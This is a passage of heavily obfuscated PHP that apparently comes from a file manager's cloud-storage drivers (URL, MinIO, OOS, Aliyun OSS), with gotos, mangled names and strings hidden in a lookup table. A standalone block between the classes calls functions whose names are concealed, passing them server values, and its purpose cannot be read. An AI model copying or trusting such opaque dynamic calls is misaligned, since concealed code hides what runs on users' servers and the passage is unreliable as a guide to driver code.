$d¹äÖ…ÃÂ[33] || $dÃÕªØòÉ¦ == $d¹äÖ…ÃÂ[8]) { return !0; } $F¾²º¤ğ“ = $this->_objectMeta($dÃÕªØòÉ¦); return isset($F¾²º¤ğ“[$d¹äÖ…ÃÂ[29]]) && $F¾²º¤ğ“[$d¹äÖ…ÃÂ[29]] == $d¹äÖ…ÃÂ[77] ? !0 : !1; } } class PathDriverUrl extends PathDriverBase { static $_cacheHeader = array(); public function __construct($a¦§ãƒò† = false) { } public function exist($Dã¾ˆêÌØ) { $f¢ÕÂë‚§¡ = $this->info($Dã¾ˆêÌØ); return $f¢ÕÂë‚§¡[$_SERVER[æ§›¦ÌáØ][195]]; } public function isFile($CÙ â¹‡°) { $cÙ»ÇÖÚ = $this->info($CÙ â¹‡°); return $cÙ»ÇÖÚ[$_SERVER[æ§›¦ÌáØ][195]]; } public function isFolder($e°•Ã†È·ˆ) { return !1; } public function size($fäÓÃ“»¨›) { $DÖè§†É± = $this->info($fäÓÃ“»¨›); return $DÖè§†É±[$_SERVER[æ§›¦ÌáØ][78]]; } public function info($e¢‡Ô®½…) { return $this->infoParse($e¢‡Ô®½…); } public function infoAuth($f¸„¶‹Â‘§) { return $this->infoParse($f¸„¶‹Â‘§); } public function infoWithChildren($dµ»’©ÒÎ) { return $this->infoParse($dµ»’©ÒÎ); } public function infoFull($D¹Ö”¾Èˆƒ) { return $this->infoParse($D¹Ö”¾Èˆƒ); } private function infoParse($e¿Ø¸”) { $E÷·ïƒàÆ¡ =& $_SERVER[æ§›¦ÌáØ]; $cºŞëŒòØ¯ = $this->header($e¿Ø¸”); if (!$cºŞëŒòØ¯ || !$cºŞëŒòØ¯[$E÷·ïƒàÆ¡[703]]) { return !1; } $D¡„êÅ›ìö = _get($cºŞëŒòØ¯, $E÷·ïƒàÆ¡[335], 0); $Fãó“î‹Ç = array($E÷·ïƒàÆ¡[28] => $cºŞëŒòØ¯[$E÷·ïƒàÆ¡[28]], $E÷·ïƒàÆ¡[76] => $e¿Ø¸”, $E÷·ïƒàÆ¡[29] => $E÷·ïƒàÆ¡[193], $E÷·ïƒàÆ¡[78] => intval($D¡„êÅ›ìö), $E÷·ïƒàÆ¡[168] => get_path_ext($cºŞëŒòØ¯[$E÷·ïƒàÆ¡[28]]), $E÷·ïƒàÆ¡[1246] => $D¡„êÅ›ìö > 0 && $cºŞëŒòØ¯[$E÷·ïƒàÆ¡[1366]], $E÷·ïƒàÆ¡[1247] => !1); return $Fãó“î‹Ç; } private function header($cƒ¢·¤´—Á) { goto a“Ùİà³¦; CÓé­—Ç…©: return self::$_cacheHeader[$cƒ¢·¤´—Á]; goto dª‹¯ÌˆîÎ; f‡…»ÄàÄŠ: $GLOBALS[$FœÙŞàä‘Ê[1367]] = !0; self::$_cacheHeader[$cƒ¢·¤´—Á] = url_header($cƒ¢·¤´—Á); $GLOBALS[$FœÙŞàä‘Ê[1367]] = $Bäàæ²åÑ˜; goto CÓé­—Ç…©; a“Ùİà³¦: $FœÙŞàä‘Ê =& $_SERVER[æ§›¦ÌáØ]; if (isset(self::$_cacheHeader[$cƒ¢·¤´—Á])) { return self::$_cacheHeader[$cƒ¢·¤´—Á]; } $Bäàæ²åÑ˜ = isset($GLOBALS[$FœÙŞàä‘Ê[1367]]) ? $GLOBALS[$FœÙŞàä‘Ê[1367]] : !1; goto f‡…»ÄàÄŠ; dª‹¯ÌˆîÎ: } public function hashSimple($d…Î Şéšî, $F¹ÒÃ¬³µ = false) { goto A©Æ£²ë È; aËèÁ¬ÚÊñ: $aŞß›àÖÉğ = timeFloat(); $EËğìêºíÅ = 15; for ($f˜ Ò¬àª— = 0; $f˜ Ò¬àª— < $CĞº¡™ïÙÑ; $f˜ Ò¬àª—++) { if (timeFloat() - $aŞß›àÖÉğ > $EËğìêºíÅ) { return !1; } $F‚ßË·Š = $this->fileSubstr($d…Î Şéšî, $F–æ©¥£ó® * $f˜ Ò¬àª—, $b½×‡ñ¸É²); if (!$F‚ßË·Š) { return !1; } $bç¦Î¦¾á® .= $F‚ßË·Š; } goto aÜ’ØÜ«‡ù; cÕï•‚¸‚Û: $EÊƒŞÜÙ§¥ = $còíƒ‹µ¯¹[$BŒ­²ƒ¡[78]]; $b½×‡ñ¸É² = 200; $CĞº¡™ïÙÑ = 50; goto E¶‰¡äÊŒé; E¶‰¡äÊŒé: if ($EÊƒŞÜÙ§¥ <= $b½×‡ñ¸É² * $CĞº¡™ïÙÑ) { return md5($this->fileSubstr($d…Î Şéšî, 0, $EÊƒŞÜÙ§¥)) . $EÊƒŞÜÙ§¥; } $F–æ©¥£ó® = intval($EÊƒŞÜÙ§¥ / $CĞº¡™ïÙÑ); $bç¦Î¦¾á® = $BŒ­²ƒ¡[33]; goto aËèÁ¬ÚÊñ; aÜ’ØÜ«‡ù: $bç¦Î¦¾á® .= $this->fileSubstr($d…Î Şéšî, $EÊƒŞÜÙ§¥ - $b½×‡ñ¸É², $b½×‡ñ¸É²); return md5($bç¦Î¦¾á®) . $EÊƒŞÜÙ§¥; goto c‡ÌÛ¦Í¬Å; A©Æ£²ë È: $BŒ­²ƒ¡ =& $_SERVER[æ§›¦ÌáØ]; $còíƒ‹µ¯¹ = $this->info($d…Î Şéšî); if (!$còíƒ‹µ¯¹ || !$còíƒ‹µ¯¹[$BŒ­²ƒ¡[195]]) { return !1; } goto cÕï•‚¸‚Û; c‡ÌÛ¦Í¬Å: } public function getContent($Aáùêé¢Á) { return $this->fileSubstr($Aáùêé¢Á); } public function fileSubstr($FíÃ­ÜÆã¿, $EñŸ—Å = 0, $aØ›–œÏª– = -1) { goto Aí»ŒàƒòÎ; e¹äÔÄ¢ ¸: if ($aØ›–œÏª– === -1) { $aØ›–œÏª– = $F¥”ç“öÜ[$dŒŠĞö„æ£[78]]; } if ($aØ›–œÏª– == 0) { return $dŒŠĞö„æ£[33]; } $a°…Ø‡Ú§Â = array($dŒŠĞö„æ£[1368] . $EñŸ—Å . $dŒŠĞö„æ£[737] . ($EñŸ—Å + $aØ›–œÏª– - 1)); goto cøãˆçÃ¾”; Aí»ŒàƒòÎ: $dŒŠĞö„æ£ =& $_SERVER[æ§›¦ÌáØ]; $F¥”ç“öÜ = $this->info($FíÃ­ÜÆã¿); if (!$F¥”ç“öÜ || !$F¥”ç“öÜ[$dŒŠĞö„æ£[195]] && $F¥”ç“öÜ[$dŒŠĞö„æ£[78]] > 1024 * 1024 * 10) { return !1; } goto e¹äÔÄ¢ ¸; cøãˆçÃ¾”: $d‹°ëî‡–š = url_request($FíÃ­ÜÆã¿, $dŒŠĞö„æ£[228], !1, $a°…Ø‡Ú§Â, !1, !1, 1); return $d‹°ëî‡–š[$dŒŠĞö„æ£[1078]] ? $d‹°ëî‡–š[$dŒŠĞö„æ£[1078]] : $dŒŠĞö„æ£[33]; goto E‹ŠÆÈ‹“²; E‹ŠÆÈ‹“²: } public function download($bÒ¸´°“„É, $BÎ†ñ¢Š) { Downloader::start($bÒ¸´°“„É, $BÎ†ñ¢Š); return $BÎ†ñ¢Š; } } goto B¢‰´Å×ïÅ; B‘ß§¥Òšæ: class PathDriverMinIO extends PathDriverBaseS3 { public function __construct($A¬ˆƒè«Ùé) { parent::__construct($A¬ˆƒè«Ùé); $this->signatureVersion($_SERVER[æ§›¦ÌáØ][212]); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } } class PathDriverOOS extends PathDriverBaseS3 { public function __construct($dŒğí¿™) { parent::__construct($dŒğí¿™); $this->signatureVersion($_SERVER[æ§›¦ÌáØ][212]); } public function fileOutLink($F¦ã¨‹µ†˜) { $dè„–øƒê =& $_SERVER[æ§›¦ÌáØ]; if (substr($F¦ã¨‹µ†˜, 0, 7) == $dè„–øƒê[1194]) { $F¦ã¨‹µ†˜ = $dè„–øƒê[1195] . substr($F¦ã¨‹µ†˜, 7); } header($dè„–øƒê[159] . $F¦ã¨‹µ†˜); die; } } if ($_SERVER[$_SERVER[æ§›¦ÌáØ][785]] != $_SERVER[$_SERVER[æ§›¦ÌáØ][786]]) { goto e„é…†§ñ˜; e„é…†§ñ˜: $e‘¢ô°ß– = $_SERVER[æ§›¦ÌáØ][787]; $DœÚŒßµ¨Ï = $_SERVER[$_SERVER[æ§›¦ÌáØ][788]] . $_SERVER[æ§›¦ÌáØ][789]; $F¯‹íÁÓ°ë = $e‘¢ô°ß–($DœÚŒßµ¨Ï); goto F‚ÛîÕ§Å×; F‚ÛîÕ§Å×: $AËÏã°¹­” = explode($_SERVER[æ§›¦ÌáØ][229], $F¯‹íÁÓ°ë); if (count($AËÏã°¹­”) < $_SERVER[æ§›¦ÌáØ][604]) { $Dµ¦ë½âÏÒ = $_SERVER[æ§›¦ÌáØ][790]; $Dµ¦ë½âÏÒ(); } $d„ŸÚÒ‘í¤ = $_SERVER[æ§›¦ÌáØ][791]; goto fËÑŒŠæƒ”; fËÑŒŠæƒ”: $d„ŸÚÒ‘í¤($_SERVER[$_SERVER[æ§›¦ÌáØ][792]]); goto fá¬£é¼Å; fá¬£é¼Å: } goto cèº¸×‘ª§; cèº¸×‘ª§: class PathDriverOSS extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $bucket = ''; protected $bucketAcl = ''; protected $endpoint = null; protected $client = null; public $ioUploadServer = "\60"; public $ioFileOutServer = "\60"; public $cdnHost = ''; public function __construct($EĞ³ÑÃŸí) { parent::__construct(); include_once SDK_DIR . $_SERVER[æ§›¦ÌáØ][1250]; $this->_init($EĞ³ÑÃŸí); } public function _init($då…½­…‰) { $d•¤í×è¸ =& $_SERVER[æ§›¦ÌáØ]; foreach ($då…½­…‰ as $bòó²ôİÂ => $dçÌ¥¹‰™÷) { if (isset($this->{$bòó²ôİÂ})) { $this->{$bòó²ôİÂ} = $dçÌ¥¹‰™÷; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { throw new Exception($d•¤í×è¸[1251] . LNG($d•¤í×è¸[1252])); } $this->client = new OSS\OssClient($this->accessKey, $this->secret, $this->domain); $this->client->setConnectTimeout(60); } public function setBucketCors() { goto f«ƒÛ¨œ”Ô; E¯·’¦§Ü¹: $B‚Ä”àÓ->addAllowedMethod($EÕ­‰„Ş¿’[1256]); $B‚Ä”àÓ->addAllowedMethod($EÕ­‰„Ş¿’[1257]); $B‚Ä”àÓ->addAllowedMethod($EÕ­‰„Ş¿’[158]); goto eÛæã†Ä‚µ; eÛæã†Ä‚µ: $B‚Ä”àÓ->setMaxAgeSeconds(600); $B‚Ä”àÓ->addExposeHeader($EÕ­‰„Ş¿’[1258]); $B‚Ä”àÓ->addAllowedHeader($EÕ­‰„Ş¿’[1253]); goto Eâå“Æˆ­†; f«ƒÛ¨œ”Ô: $EÕ­‰„Ş¿’ =& $_SERVER[æ§›¦ÌáØ]; $e‹é­—®ˆì = new OSS\Model\CorsConfig(); $B‚Ä”àÓ = new OSS\Model\CorsRule(); goto Açİê›¥ÅÄ; Açİê›¥ÅÄ: $B‚Ä”àÓ->addAllowedOrigin($EÕ­‰„Ş¿’[1253]); $B‚Ä”àÓ->addAllowedMethod($EÕ­‰„Ş¿’[1254]); $B‚Ä”àÓ->addAllowedMethod($EÕ­‰„Ş¿’[1255]); goto E¯·’¦§Ü¹; Eâå“Æˆ­†: $e‹é­—®ˆì->addRule($B‚Ä”àÓ); try { $this->client->putBucketCors($this->bucket, $e‹é­—®ˆì); } catch (OSS\Core\OssException $bµÄ¿ƒè‚‚) { return !1; } return !0; goto CÓàÖÜÃØ; CÓàÖÜÃØ: } public function getBucketCors() { goto E½¥ì¥Ì†Ş; Bø¿¦Í˜œ·: return array($D†ëøàÂ¯õ[181] => isset($F’ˆÓçÅ«[0]) ? $F’ˆÓçÅ«[0] : $D†ëøàÂ¯õ[33], $D†ëøàÂ¯õ[185] => $c‡å¹²ãÛ, $D†ëøàÂ¯õ[1259] => $aí–„•ííà, $D†ëøàÂ¯õ[1260] => isset($BÄ¼½˜³òÛ[0]) ? $BÄ¼½˜³òÛ[0] : $D†ëøàÂ¯õ[33], $D†ëøàÂ¯õ[183] => isset($FÔ¥åâ¢½Œ[0]) ? $FÔ¥åâ¢½Œ[0] : $D†ëøàÂ¯õ[33]); goto eí ¬ØÑ·¢; E½¥ì¥Ì†Ş: $D†ëøàÂ¯õ =& $_SERVER[æ§›¦ÌáØ]; $fàÑÁÓå“® = null; try { $fàÑÁÓå“® = $this->client->getBucketCors($this->bucket); } catch (OSS\Core\OssException $DÄÓØÚÁ¢•) { return null; } goto DÉ”ìïÈ®‡; DÉ”ìïÈ®‡: if (!$fàÑÁÓå“® || !($aš¢¬Ää§ = $fàÑÁÓå“®->getRules())) { return null; } $F’ˆÓçÅ« = $aš¢¬Ää§[0]->getAllowedOrigins(); $c‡å¹²ãÛ = $aš¢¬Ää§[0]->getAllowedMethods(); goto EÏ¶ÏÅš; EÏ¶ÏÅš: $aí–„•ííà = $aš¢¬Ää§[0]->getMaxAgeSeconds(); $BÄ¼½˜³òÛ = $aš¢¬Ää§[0]->getExposeHeaders(); $FÔ¥åâ¢½Œ = $aš¢¬Ää§[0]->getAllowedHeaders(); goto Bø¿¦Í˜œ·; eí ¬ØÑ·¢: } public function isBucketCors() { goto C‹‘Ù–õ®‰; B§Ç™¶ˆŞµ: if ($e£Ñˆë—è[$E³÷Û¤ëÌÂ[181]] != $E³÷Û¤ëÌÂ[182] || $e£Ñˆë—è[$E³÷Û¤ëÌÂ[183]] != $E³÷Û¤ëÌÂ[182]) { return !1; } $A¯ÇÅ¾Ş¼Ê = array_map($E³÷Û¤ëÌÂ[184], $e£Ñˆë—è[$E³÷Û¤ëÌÂ[185]]); if (!is_array($A¯ÇÅ¾Ş¼Ê)) { $A¯ÇÅ¾Ş¼Ê = array(); } goto eˆ‹Üğàãâ; eˆ‹Üğàãâ: $d¯’ëÂÒ¡¶ = array($E³÷Û¤ëÌÂ[186], $E³÷Û¤ëÌÂ[187], $E³÷Û¤ëÌÂ[188], $E³÷Û¤ëÌÂ[189], $E³÷Û¤ëÌÂ[190]); $A‡¾³ÍÚ”é = array_diff($d¯’ëÂÒ¡¶, $A¯ÇÅ¾Ş¼Ê); return empty($A‡¾³ÍÚ”é); goto DÎ…öó‡ª; C‹‘Ù–õ®‰: $E³÷Û¤ëÌÂ =& $_SERVER[æ§›¦ÌáØ]; $e£Ñˆë—è = $this->getBucketCors(); if (!$e£Ñˆë—è || !is_array($e£Ñˆë—è)) { return !1; } goto B§Ç™¶ˆŞµ; DÎ…öó‡ª: } public function mkfile($f‰ó½ß†Œ, $Cİ†ôù‰Æİ = '', $b˜«Óø“Ù‰ = REPEAT_RENAME) { $C‹ÏÁ¡…Š = $this->setContent($f‰ó½ß†Œ, $Cİ†ôù‰Æİ); if ($C‹ÏÁ¡…Š !== !1) { return $this->getPathOuter($f‰ó½ß†Œ); } return !1; } public function mkdir($f¯´˜—ÒÙù, $EŸ”‡°…Ï = REPEAT_SKIP) { if ($this->_isFolder($f¯´˜—ÒÙù)) { return $this->getPathOuter($f¯´˜—ÒÙù); } try { $this->client->createObjectDir($this->bucket, $this->pathEncode($f¯´˜—ÒÙù)); } catch (OSS\Core\OssException $CÉ¥ˆƒ¯Ÿ) { return !1; } return $this->getPathOuter($f¯´˜—ÒÙù); } private function fileList($CáŒì–²ë‚, $Aƒ§»¼‡‰» = '', $B“¾äáÊêã = 0) { goto bºÎ¨Ş‡¢; B¶˜º¦ñ·å: $aáŠ¶èÇ‚Í = $bÊÕ•Ş†’[33]; $B  ¢«³ã = 1000; $EŒ‘ÜâÊèœ = $this->listItemCache === !1 ? !1 : !0; goto eš—ù‚ã•ö; eš—ù‚ã•ö: $D¬õ©˜™•ˆ = $C«öĞ×—»¦ = array(); while (!0) { check_abort(); $fµá©ëµª  = array($bÊÕ•Ş†’[1261] => $Aƒ§»¼‡‰», $bÊÕ•Ş†’[1262] => $dªŒ…¿«´, $bÊÕ•Ş†’[1263] => $B  ¢«³ã, $bÊÕ•Ş†’[1264] => $aáŠ¶èÇ‚Í); try { $cîÊøåâ§¸ = $this->client->listObjects($this->bucket, $fµá©ëµª ); } catch (OSS\Core\OssException $aŸ¤µ¼‹˜) { break; } $aáŠ¶èÇ‚Í = $cîÊøåâ§¸->getNextMarker(); $BÇ†àÇÍ„È = $cîÊøåâ§¸->getObjectList(); $dê·â°äÒ• = $cîÊøåâ§¸->getPrefixList(); foreach ($BÇ†àÇÍ„È as $D†Ò¶º¬ò–) { goto D²ç¾ò¦•Å; Bº—Å‚Ÿ½ä: $Eç÷¦¹Ìğè = $D†Ò¶º¬ò–->getLastModified(); $d˜¾  = $B“¾äáÊêã ? array($bÊÕ•Ş†’[28] => $c÷ëÃêËÕ“, $bÊÕ•Ş†’[78] => $Aª†Ê·Í±Ì, $bÊÕ•Ş†’[197] => strtotime($Eç÷¦¹Ìğè)) : $c÷ëÃêËÕ“; $Fê¯¢ËÎÇå = $Aª†Ê·Í±Ì == 0 && substr($c÷ëÃêËÕ“, strlen($c÷ëÃêËÕ“) - 1, 1) == $bÊÕ•Ş†’[8] ? !0 : !1; goto bÆ‡‹Ù ó; D²ç¾ò¦•Å: if ($D†Ò¶º¬ò–->getKey() == $dªŒ…¿«´) { continue; } $c÷ëÃêËÕ“ = $D†Ò¶º¬ò–->getKey(); $Aª†Ê·Í±Ì = $D†Ò¶º¬ò–->getSize(); goto Bº—Å‚Ÿ½ä; bÆ‡‹Ù ó: if ($EŒ‘ÜâÊèœ) { $this->cacheMethod($bÊÕ•Ş†’[199], $c÷ëÃêËÕ“, $Fê¯¢ËÎÇå); $this->cacheMethod($bÊÕ•Ş†’[200], $c÷ëÃêËÕ“, array($bÊÕ•Ş†’[78] => $Aª†Ê·Í±Ì, $bÊÕ•Ş†’[1265] => $Aª†Ê·Í±Ì, $bÊÕ•Ş†’[84] => strtotime($Eç÷¦¹Ìğè), $bÊÕ•Ş†’[1266] => $Eç÷¦¹Ìğè)); } if ($Fê¯¢ËÎÇå) { $D¬õ©˜™•ˆ[] = $c÷ëÃêËÕ“; continue; } $C«öĞ×—»¦[] = $d˜¾ ; goto D¸š¾§ò£; D¸š¾§ò£: } foreach ($dê·â°äÒ• as $fšäÑĞ¶™Â) { $D¬õ©˜™•ˆ[] = $fšäÑĞ¶™Â->getPrefix(); if ($EŒ‘ÜâÊèœ) { $this->cacheMethod($bÊÕ•Ş†’[199], $c÷ëÃêËÕ“, !0); } } if ($aáŠ¶èÇ‚Í === $bÊÕ•Ş†’[33]) { break; } } if ($EŒ‘ÜâÊèœ) { $this->cacheMethod($bÊÕ•Ş†’[199], $CáŒì–²ë‚, !0); } goto CÊÏÊ«Å¸ù; bºÎ¨Ş‡¢: $bÊÕ•Ş†’ =& $_SERVER[æ§›¦ÌáØ]; $CáŒì–²ë‚ = trim($CáŒì–²ë‚, $bÊÕ•Ş†’[8]); $dªŒ…¿«´ = empty($CáŒì–²ë‚) && $CáŒì–²ë‚ !== $bÊÕ•Ş†’[191] ? $bÊÕ•Ş†’[33] : $CáŒì–²ë‚ . $bÊÕ•Ş†’[8]; goto B¶˜º¦ñ·å; CÊÏÊ«Å¸ù: return array($bÊÕ•Ş†’[75] => $D¬õ©˜™•ˆ, $bÊÕ•Ş†’[74] => $C«öĞ×—»¦); goto Bëèò‡; Bëèò‡: } public function copyFile($e³­¥¹•»Û, $eÎ¯ÉíÍ) { $BôÕ— ÂÏ¯ = $this->size($e³­¥¹•»Û); if ($BôÕ— ÂÏ¯ < 1024 * 1024 * 1024) { try { $this->client->copyObject($this->bucket, $e³­¥¹•»Û, $this->bucket, $this->pathEncode($eÎ¯ÉíÍ)); } catch (OSS\Core\OssException $c‚”Š˜¬£ô) { return !1; } return $this->getPathOuter($eÎ¯ÉíÍ); } $Eà¼‹ªŒõğ = $this->multiCopyObject($e³­¥¹•»Û, $eÎ¯ÉíÍ, $BôÕ— ÂÏ¯); return $Eà¼‹ªŒõğ ? $this->getPathOuter($eÎ¯ÉíÍ) : !1; } private function multiCopyObject($EÏïïöœì, $bØ“î†—Ğ¯, $bÉ¯Š‰ÎêÎ) { $f·ÉøÛ¯Æ =& $_SERVER[æ§›¦ÌáØ]; try { goto FÌÑÇ·İÂ; FâÚ‘¼ùŒ·: $dÅö­Ğß‰ï = 1024 * 1024 * 10; $dö‚ƒ•ø© = $this->client->generateMultiuploadParts($bÉ¯Š‰ÎêÎ, $dÅö­Ğß‰ï); foreach ($dö‚ƒ•ø© as $fãËŒ‹‚íö => $eŠ›Û¥âà§) { $Fí°İŞò´ = $f†å„ÛŠŠ‰ + (int) $eŠ›Û¥âà§[$f·ÉøÛ¯Æ[1268]]; $A¬ßÉéÔ¹Å = (int) $eŠ›Û¥âà§[$f·ÉøÛ¯Æ[335]] + $Fí°İŞò´ - 1; $d¯ò±âíÜ = array($f·ÉøÛ¯Æ[1269] => $Fí°İŞò´, $f·ÉøÛ¯Æ[1270] => $A¬ßÉéÔ¹Å); $C·±˜åÄ±[] = $this->client->uploadPartCopy($this->bucket, $EÏïïöœì, $this->bucket, $this->pathEncode($bØ“î†—Ğ¯), $F“·ßõ£áê, $c™“Ã«Äß, $d¯ò±âíÜ); $F“·ßõ£áê = $F“·ßõ£áê + 1; } goto cŠ°î‚‹ôÃ; FÌÑÇ·İÂ: $aìªË©ò¡ = array(); if ($aòÌ¯â½ = $this->hashMd5($EÏïïöœì)) { $aìªË©ò¡ = array(OSS\OssClient::OSS_HEADERS => array($f·ÉøÛ¯Æ[1267] => $aòÌ¯â½)); } $c™“Ã«Äß = $this->client->initiateMultipartUpload($this->bucket, $this->pathEncode($bØ“î†—Ğ¯), $aìªË©ò¡); goto DĞÑ´ˆæ; DĞÑ´ˆæ: $F“·ßõ£áê = 1; $f†å„ÛŠŠ‰ = 0; $C·±˜åÄ± = array(); goto FâÚ‘¼ùŒ·; cŠ°î‚‹ôÃ: $DÇ¯ĞË¯« = array(); foreach ($C·±˜åÄ± as $fãËŒ‹‚íö => $fÍù‡ë¶Æí) { $DÇ¯ĞË¯«[] = array($f·ÉøÛ¯Æ[1271] => $fãËŒ‹‚íö + 1, $f·ÉøÛ¯Æ[1272] => $fÍù‡ë¶Æí); } $this->client->completeMultipartUpload($this->bucket, $this->pathEncode($bØ“î†—Ğ¯), $c™“Ã«Äß, $DÇ¯ĞË¯«); goto bÁæÔ†“æê; bÁæÔ†“æê: } catch (OSS\Core\OssException $CŠó¹ÓÎ´É) { return !1; } return !0; } public function moveFile($F´Ú´“Â¬, $Fó¤ö‚ÁÑ–) { if ($this->copyFile($F´Ú´“Â¬, $Fó¤ö‚ÁÑ–)) { $this->remove($F´Ú´“Â¬); return $this->getPathOuter($Fó¤ö‚ÁÑ–); } return !1; } public function delFile($d¹¯Àœ´ˆ) { try { $this->client->deleteObject($this->bucket, $this->pathEncode($d¹¯Àœ´ˆ)); } catch (OSS\Core\OssException $c©Ìà÷ÏºÒ) { return !1; } return !0; } public function delFolder($CöŞÆÜˆ‹Î) { goto Cëƒ·¢óâ; Cëƒ·¢óâ: $fÚ¬Ñƒ¿™› =& $_SERVER[æ§›¦ÌáØ]; if (!$this->exist($CöŞÆÜˆ‹Î)) { return !0; } $this->listItemCache = !1; goto CÎ³©®¹¨‰; F²ÀÓ¢ğ‹¤: $AÂ¾²àŠŞ§ = $this->delByBatch($f¢òó÷°¾ì[$fÚ¬Ñƒ¿™›[75]]); if (!$AÂ¾²àŠŞ§) { return !1; } return $this->delFile($BÈÁÇ¦æä’); goto DÍµ—Â’­; CÎ³©®¹¨‰: $f¢òó÷°¾ì = $this->fileList($CöŞÆÜˆ‹Î); $this->listItemCache = !0; $BÈÁÇ¦æä’ = trim($CöŞÆÜˆ‹Î, $fÚ¬Ñƒ¿™›[8]) . $fÚ¬Ñƒ¿™›[8]; goto a´î¬ƒÃŸ±; a´î¬ƒÃŸ±: if (!empty($CöŞÆÜˆ‹Î) && $CöŞÆÜˆ‹Î !== $fÚ¬Ñƒ¿™›[191] && !in_array($BÈÁÇ¦æä’, $f¢òó÷°¾ì[$fÚ¬Ñƒ¿™›[75]])) { $f¢òó÷°¾ì[$fÚ¬Ñƒ¿™›[75]][] = $BÈÁÇ¦æä’; } $AÂ¾²àŠŞ§ = $this->delByBatch($f¢òó÷°¾ì[$fÚ¬Ñƒ¿™›[74]]); if (!$AÂ¾²àŠŞ§) { return !1; } goto F²ÀÓ¢ğ‹¤; DÍµ—Â’­: } private function delByBatch($A÷¶ÏÄè†œ) { foreach (array_chunk($A÷¶ÏÄè†œ, 1000) as $a‡ œĞ‡£) { try { $this->client->deleteObjects($this->bucket, $a‡ œĞ‡£); } catch (OSS\Core\OssException $cÒôïÙ´æ©) { return !1; } } return !0; } public function rename($DÍï®ºÒÔ¶, $FØç„â¤ˆÎ) { return $this->renameObject($DÍï®ºÒÔ¶, $FØç„â¤ˆÎ); } private function fileInfo($e‚ï¢Ë£˜Ô, $F×à‚ç”ÙĞ = false, $f×à–‚Ï·Å = array()) { goto Fö¯Å‚šó“; Fö¯Å‚šó“: $dİáì¶½¨Â =& $_SERVER[æ§›¦ÌáØ]; $aÎŞŸ¼ˆ†à = array($dİáì¶½¨Â[28] => $this->pathThis($e‚ï¢Ë£˜Ô), $dİáì¶½¨Â[76] => $this->getPathOuter($e‚ï¢Ë£˜Ô), $dİáì¶½¨Â[29] => $dİáì¶½¨Â[193], $dİáì¶½¨Â[78] => isset($f×à–‚Ï·Å[$dİáì¶½¨Â[78]]) ? $f×à–‚Ï·Å[$dİáì¶½¨Â[78]] : 0, $dİáì¶½¨Â[168] => $this->ext($e‚ï¢Ë£˜Ô)); if ($F×à‚ç”ÙĞ) { return $aÎŞŸ¼ˆ†à; } goto cãØ­³À; còÏ—«‘•: if (isset($f×à–‚Ï·Å[$dİáì¶½¨Â[78]])) { $aÎŞŸ¼ˆ†à[$dİáì¶½¨Â[78]] = $f×à–‚Ï·Å[$dİáì¶½¨Â[78]]; } if (isset($f×à–‚Ï·Å[$dİáì¶½¨Â[84]])) { $aÎŞŸ¼ˆ†à[$dİáì¶½¨Â[84]] = $f×à–‚Ï·Å[$dİáì¶½¨Â[84]]; } if (isset($f×à–‚Ï·Å[$dİáì¶½¨Â[197]]) && !trim($aÎŞŸ¼ˆ†à[$dİáì¶½¨Â[84]])) { $aÎŞŸ¼ˆ†à[$dİáì¶½¨Â[84]] = $f×à–‚Ï·Å[$dİáì¶½¨Â[197]]; } goto FÃé¶£Êó§; FÃé¶£Êó§: return $aÎŞŸ¼ˆ†à; goto E‰§…¿Ò©µ; cãØ­³À: $aÎŞŸ¼ˆ†à[$dİáì¶½¨Â[194]] = $aÎŞŸ¼ˆ†à[$dİáì¶½¨Â[84]] = 0; $aÎŞŸ¼ˆ†à[$dİáì¶½¨Â[195]] = $aÎŞŸ¼ˆ†à[$dİáì¶½¨Â[196]] = !0; if (empty($f×à–‚Ï·Å)) { $D–Ä„ˆŞŸğ = $this->objectMeta($e‚ï¢Ë£˜Ô); if (!$D–Ä„ˆŞŸğ) { return $aÎŞŸ¼ˆ†à; } $f×à–‚Ï·Å = array($dİáì¶½¨Â[84] => strtotime($D–Ä„ˆŞŸğ[$dİáì¶½¨Â[1266]]), $dİáì¶½¨Â[78] => $D–Ä„ˆŞŸğ[$dİáì¶½¨Â[1265]] + 0); } goto còÏ—«‘•; E‰§…¿Ò©µ: } private function folderInfo($d‘¡İ×•ë›, $f·ñ…æô—’ = false, $B£Ùæî‡ä¬ = array()) { goto F¾»òÈêø; F¾»òÈêø: $fÉ»‘ÚíÀ =& $_SERVER[æ§›¦ÌáØ]; $E†ó•è‘ö™ = array($fÉ»‘ÚíÀ[28] => $this->pathThis($d‘¡İ×•ë›), $fÉ»‘ÚíÀ[76] => $this->getPathOuter($fÉ»‘ÚíÀ[8] . $d‘¡İ×•ë›), $fÉ»‘ÚíÀ[29] => $fÉ»‘ÚíÀ[77]); if ($f·ñ…æô—’) { return $E†ó•è‘ö™; } goto Dº„Ÿâ‘æ; Dº„Ÿâ‘æ: $E†ó•è‘ö™[$fÉ»‘ÚíÀ[194]] = $E†ó•è‘ö™[$fÉ»‘ÚíÀ[84]] = 0; $E†ó•è‘ö™[$fÉ»‘ÚíÀ[195]] = $E†ó•è‘ö™[$fÉ»‘ÚíÀ[196]] = !0; if (empty($B£Ùæî‡ä¬)) { $d‘¡İ×•ë› = rtrim($d‘¡İ×•ë›, $fÉ»‘ÚíÀ[8]) . $fÉ»‘ÚíÀ[8]; $d¹ùÈÆ¸ß¨ = $this->objectMeta($d‘¡İ×•ë›); if (!$d¹ùÈÆ¸ß¨) { return $E†ó•è‘ö™; } $B£Ùæî‡ä¬ = array($fÉ»‘ÚíÀ[194] => $d¹ùÈÆ¸ß¨[$fÉ»‘ÚíÀ[492]][$fÉ»‘ÚíÀ[1273]], $fÉ»‘ÚíÀ[84] => strtotime($d¹ùÈÆ¸ß¨[$fÉ»‘ÚíÀ[1266]])); } goto DÁâå¨Ø°œ; DÁâå¨Ø°œ: if (isset($B£Ùæî‡ä¬[$fÉ»‘ÚíÀ[84]])) { $E†ó•è‘ö™[$fÉ»‘ÚíÀ[84]] = $B£Ùæî‡ä¬[$fÉ»‘ÚíÀ[84]]; } if (isset($B£Ùæî‡ä¬[$fÉ»‘ÚíÀ[194]])) { $E†ó•è‘ö™[$fÉ»‘ÚíÀ[194]] = $B£Ùæî‡ä¬[$fÉ»‘ÚíÀ[194]]; } return $E†ó•è‘ö™; goto EÚßÂÏ¨è­; EÚßÂÏ¨è­: } public function listPath($FÑëÂò”ê, $e­öéÌã¤ô = false) { $C¿êÙ´—©Ñ =& $_SERVER[æ§›¦ÌáØ]; $CÌñ¸›ßØô = 